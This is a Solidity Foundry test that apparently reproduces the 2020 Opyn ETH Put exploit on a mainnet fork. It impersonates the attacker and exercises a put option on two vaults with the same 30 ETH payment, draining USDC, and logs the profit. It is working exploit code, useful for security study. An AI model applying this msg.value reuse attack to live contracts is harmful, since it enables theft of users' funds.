// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
@Analysis 
https://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8

@Transaction
0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a*/

contract ContractTest is Test {
    IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);

    address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        cheats.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
    }

    function test_attack() public {
        cheats.startPrank(attacker);

        uint256 balBefore = usdc.balanceOf(attacker) / 1e6;
        console.log("Attacker USDC balance before is    ", balBefore);
        console.log("------EXPLOIT-----");

        //Adds ERC20 collateral, and mints new oTokens in one step
        uint256 amtToCreate = 300_000_000;
        uint256 amtCollateral = 9_900_000_000;
        opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);

        //create an arry of vaults
        address payable[] memory _arr = new address payable[](2);
        _arr[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f);
        _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);

        //The attacker excercises the put option on two different valuts using the same msg.value
        opyn.exercise{value: 30 ether}(600_000_000, _arr);

        //remove share of underlying after excercise
        opyn.removeUnderlying();

        uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
        console.log("Attacker USDC balance after is     ", balAfter);
        console.log("Attacker profit is                  ", balAfter - balBefore);
    }
}
